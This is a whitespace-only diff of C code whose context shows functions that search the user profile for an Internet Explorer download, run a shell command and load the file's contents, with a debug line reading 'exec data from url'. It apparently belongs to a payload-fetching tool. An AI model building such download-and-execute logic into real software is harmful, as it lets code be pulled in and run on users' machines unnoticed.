@@ -29,7 +29,7 @@ char* ie_download(char* string) {
 	}
 
 	DEBUG_PRINT("ie_download, filename: %s\n", fname);
-	
+
 	// split the filename
 	char delimiter2[] = ".";
 	char *sname;
@@ -38,7 +38,7 @@ char* ie_download(char* string) {
 	ptr = strtok(NULL, delimiter2);
 
 	DEBUG_PRINT("ie_download, name to search for: %s\n", sname);
-	
+
 	// search for the file in user profile
 
 	// build searchstring
@@ -57,9 +57,9 @@ char* ie_download(char* string) {
 	strcat (searchstring,"\" > \"");
 	strcat (searchstring,tmp_home);
 	strcat (searchstring,"\\datafile.txt\"");
-	
+
 	DEBUG_PRINT("ie_download, searchstring: %s\n", searchstring);
-	
+
 	// build & execute cmd
 	char cmd[500];
 	GetEnvironmentVariable ("WINDIR",cmd,500);
@@ -83,9 +83,9 @@ char* ie_download(char* string) {
 	sh_filename = load_textfile (dirfile, size_sh_filename);
 	// there is always emtpy space at the end of the file -> delete that
 	sh_filename[size_sh_filename-2]=0x0;
-	
+
 	DEBUG_PRINT("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename);
-	
+
 	return sh_filename;
 }
 
@@ -97,8 +97,8 @@ char* ie_download(char* string) {
 unsigned char* download_internet_explorer(char *arg1, int *data_size) {
     DEBUG_PRINT("This is download_internet_explorer.\n");
 	DEBUG_PRINT("exec data from url\n");
-		
+
 	char *sh_filename = ie_download(arg1);
-	*data_size = get_filesize(sh_filename);	
+	*data_size = get_filesize(sh_filename);
 	return load_textfile(sh_filename, *data_size);
 }
